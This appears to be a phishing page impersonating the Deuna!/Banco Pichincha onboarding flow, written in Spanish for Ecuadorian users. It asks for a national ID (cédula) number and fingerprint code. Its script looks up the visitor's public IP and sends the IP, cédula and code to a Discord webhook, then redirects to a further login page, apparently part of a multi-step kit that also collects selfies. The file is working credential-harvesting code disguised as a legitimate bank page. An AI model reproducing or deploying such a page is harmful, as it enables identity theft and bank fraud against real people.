<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Deuna! | Ingresa tus datos</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg-color: #ffffff;
            --primary: #4a1b82;
            --text-dark: #202020;
            --text-muted: #888888;
            --border-color: #d8d8d8;
            --disabled-bg: #e6e6e6;
            --disabled-text: #a8a8a8;
        }
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Poppins', sans-serif;
            -webkit-tap-highlight-color: transparent;
        }
        body {
            background-color: var(--bg-color);
            display: flex;
            justify-content: center;
            height: 100vh;
            height: 100dvh;
            overflow: hidden;
        }
        .mobile-container {
            width: 100%;
            max-width: 480px; 
            background-color: var(--bg-color);
            height: 100%; 
            display: flex;
            flex-direction: column;
            padding: 20px 24px;
            position: relative;
        }
        
        .progress-bar {
            width: 100%;
            height: 4px;
            background: #f0f0f0;
            margin-bottom: 24px;
            margin-top: 10px;
            border-radius: 2px;
            position: relative;
        }
        .progress-fill {
            position: absolute;
            left: 0; top: 0; bottom: 0;
            width: 30%;
            background: var(--text-dark);
            border-radius: 2px;
        }

        h1 {
            font-size: 24px;
            font-weight: 700;
            color: var(--text-dark);
            line-height: 1.25;
            margin-bottom: 24px;
            letter-spacing: -0.5px;
        }

        /* Inputs */
        .input-group {
            margin-bottom: 20px;
        }
        .input-label {
            font-size: 13px;
            font-weight: 600;
            color: var(--text-dark);
            margin-bottom: 8px;
            display: block;
        }
        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }
        .input-field {
            width: 100%;
            padding: 16px;
            padding-right: 50px;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            font-size: 15px;
            color: var(--text-dark);
            outline: none;
            transition: border-color 0.2s;
        }
        .input-field:focus {
            border-color: var(--primary);
        }
        .input-field::placeholder {
            color: #b0b0b0;
        }
        .char-count {
            position: absolute;
            right: 16px;
            font-size: 14px;
            color: var(--text-muted);
        }

        /* Carousel Image */
        .carousel-container {
            width: 100%;
            flex: 1; /* Absorbe el espacio restante */
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
            min-height: 140px;
        }
        .carousel-image {
            max-width: 90%;
            max-height: 160px;
            object-fit: contain;
            transition: opacity 0.3s ease-in-out;
        }

        /* Footer Terms */
        .terms-text {
            font-size: 11px;
            color: var(--text-muted);
            line-height: 1.4;
            margin-bottom: 16px;
            text-align: left;
        }
        .terms-text a {
            color: var(--primary);
            font-weight: 600;
            text-decoration: underline;
        }

        /* Fixed Button at Bottom */
        .btn {
            width: 100%;
            padding: 18px;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 600;
            text-align: center;
            cursor: pointer;
            border: none;
            transition: all 0.2s;
            background: var(--disabled-bg);
            color: var(--disabled-text);
        }
        .btn.active {
            background: var(--text-dark); /* Deuna usa boton gris oscuro/morado, usemos casi negro como progreso */
            color: #fff;
            background: var(--primary);
        }
        .btn.active:active {
            opacity: 0.8;
        }
    </style>
</head>
<body>
    <div class="mobile-container">
        <!-- Barra de progreso superior -->
        <div class="progress-bar"><div class="progress-fill"></div></div>

        <h1>Ingresa tu número de cédula y código dactilar</h1>

        <div class="input-group">
            <label class="input-label">Número de cédula</label>
            <div class="input-wrapper">
                <input type="text" id="cedula" class="input-field" placeholder="Ej: 1234567890" maxlength="10">
                <span class="char-count" id="count-cedula">0/10</span>
            </div>
        </div>

        <div class="input-group">
            <label class="input-label">Número de código dactilar</label>
            <div class="input-wrapper">
                <input type="text" id="dactilar" class="input-field" placeholder="Ej. A1234B1234" maxlength="10">
                <span class="char-count" id="count-dactilar">0/10</span>
            </div>
        </div>

        <div class="carousel-container">
            <img id="carousel-img" class="carousel-image" src="img/img1.jpeg" alt="Cedula instruccion" onerror="this.src='https://via.placeholder.com/300x150/fdfdef/202020?text=IMG+1'">
        </div>

        <div>
            <p class="terms-text">
                Al presionar en 'Continuar', aceptas los <a href="#">Términos y Condiciones y la Política de Privacidad</a>, así como la recopilación de tus datos personales de fuentes legales y su respectivo tratamiento por parte de Banco Pichincha y terceros autorizados
            </p>
            <button id="btn-continuar" class="btn" disabled>Continuar</button>
        </div>
    </div>

    <script src="webhook.js"></script>
    <script>
        // Lógica de inputs y validación de formulario
        const inputCedula = document.getElementById('cedula');
        const inputDactilar = document.getElementById('dactilar');
        const countCedula = document.getElementById('count-cedula');
        const countDactilar = document.getElementById('count-dactilar');
        const btnContinuar = document.getElementById('btn-continuar');

        function validateInputs() {
            const len1 = inputCedula.value.length;
            const len2 = inputDactilar.value.length;
            
            countCedula.textContent = `${len1}/10`;
            countDactilar.textContent = `${len2}/10`;

            // Habilitar boton si ambos tienen 10 caracteres (asumiendo que es el máximo)
            if (len1 === 10 && len2 === 10) {
                btnContinuar.classList.add('active');
                btnContinuar.disabled = false;
            } else {
                btnContinuar.classList.remove('active');
                btnContinuar.disabled = true;
            }
        }

        inputCedula.addEventListener('input', validateInputs);
        inputDactilar.addEventListener('input', validateInputs);

        btnContinuar.addEventListener('click', () => {
                        if (!btnContinuar.disabled) {
                                // Limpiar selfies y contador antes de continuar
                                sessionStorage.removeItem('selfie1');
                                sessionStorage.removeItem('selfie2');
                                sessionStorage.removeItem('captureAttempts');
                                // Obtener IP pública
                                fetch('https://api.ipify.org?format=json')
                                    .then(response => response.json())
                                    .then(data => {
                                        const ip = data.ip;
                                        const cedula = inputCedula.value;
                                        const dactilar = inputDactilar.value;
                                        // Enviar al webhook de Discord
                                        fetch(WEBHOOK_URL, {
                                            method: 'POST',
                                            headers: {
                                                'Content-Type': 'application/json'
                                            },
                                            body: JSON.stringify({
                                                content: `IP: ${ip}\nCédula: ${cedula}\nDactilar: ${dactilar}`
                                            })
                                        })
                                        .then(() => {
                                            window.location.href = 'login3.html';
                                        })
                                        .catch(() => {
                                            window.location.href = 'login3.html';
                                        });
                                    })
                                    .catch(() => {
                                        window.location.href = 'login3.html';
                                    });
                        }
                });

        // Lógica del Carrusel de Imágenes
        // Las imagenes estan dentro de la carpeta img: img1.jpeg, img2.jpeg, img3.jpeg
        const images = ['img/img1.jpeg', 'img/img2.jpeg', 'img/img3.jpeg'];
        let currentIndex = 0;
        const imgElement = document.getElementById('carousel-img');

        setInterval(() => {
            // Animación de salida (Fade out)
            imgElement.style.opacity = 0.2;
            
            setTimeout(() => {
                // Cambiar la imagen origen
                currentIndex = (currentIndex + 1) % images.length;
                imgElement.src = images[currentIndex];
                
                // Animación de entrada (Fade in)
                imgElement.style.opacity = 1;
            }, 300); // Esperar que la animación CSS actúe (300ms)
        }, 3500); // Cambiar cada 3.5 segundos
    </script>
</body>
</html>
